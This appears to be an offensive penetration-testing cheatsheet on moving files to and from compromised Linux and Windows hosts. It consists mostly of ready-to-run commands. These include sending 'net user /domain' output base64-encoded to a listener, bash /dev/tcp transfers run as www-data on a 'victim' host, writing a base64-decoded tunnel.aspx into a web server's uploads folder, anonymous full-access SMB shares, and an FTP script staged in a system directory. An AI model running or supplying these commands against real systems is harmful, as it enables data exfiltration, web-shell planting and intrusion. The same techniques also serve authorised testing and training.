## File Transfer



### Linux

* [snovvcrash.github.io/2018/10/11/simple-http-servers.html](https://snovvcrash.github.io/2018/10/11/simple-http-servers.html)



### Windows


#### Base64

* [github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py)

Local file to base64:

```bash 
certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
type C:\Windows\Temp\encoded.b64
```

Local string to base64 and POST:

```bash
$str = cmd /c net user /domain
$base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
```



### Linux2Linux


#### /dev/tcp


**Sender:**
```bash
root@kali:$ nc -w3 -lvnp 1234 < file.txt
```
**Recipient:**
```bash
www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > /tmp/.file'
```

**Recipient:**
```bash
root@kali:$ nc -w3 -lvnp 1234 > file.txt
```
**Sender:**
```bash
www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
```

### Linux2Windows

* [blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)


#### Base64

Full base64 file transfer from Linux to Windows:

```bash
root@kali:$ base64 -w0 tunnel.aspx; echo
...BASE64_CONTENTS...
PS > Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
PS > $data = Get-Content -Raw tunnel.b64
PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert]::FromBase64String($data))
```
#### SMB

##### impacket-smbserver

SMB server (communicate with Windows **[1]**):

```bash
root@kali:$ impacket-smbserver -smb2support files `pwd`
```

1. [serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)

Mount SMB in Windows with `net use`:

```bash
root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
PS > net use Z: \\10.10.14.16\share
PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
```

Mount SMB in Windows with `New-PSDrive`:

```bash
root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
Or
PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force))
PS > New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
PS > cd Z:
```

##### net share

```bash 
net share pentest=c:\smb_pentest /GRANT:"Anonymous Logon,FULL" /GRANT:"Everyone,FULL"
```
Or
```bash 
net share pentest=c:\smb_pentest /GRANT:"Administrator,FULL"
net share pentest /delete
```


#### FTP

```bash
$ python -m pip install pyftpdlib
$ python -m pyftpdlib -Dwp 2121
Cmd > cd C:\Windows\System32\spool\drivers\color
Cmd > echo 'open 127.0.0.1 2121' > ftp.txt
Cmd > echo 'user anonymous' >> ftp.txt
Cmd > echo 'anonymous' >> ftp.txt
Cmd > echo 'binary' >> ftp.txt
Cmd > echo 'put file.bin' >> ftp.txt
Cmd > echo 'bye' >> ftp.txt
Cmd > ftp -v -n -s:ftp.txt
```
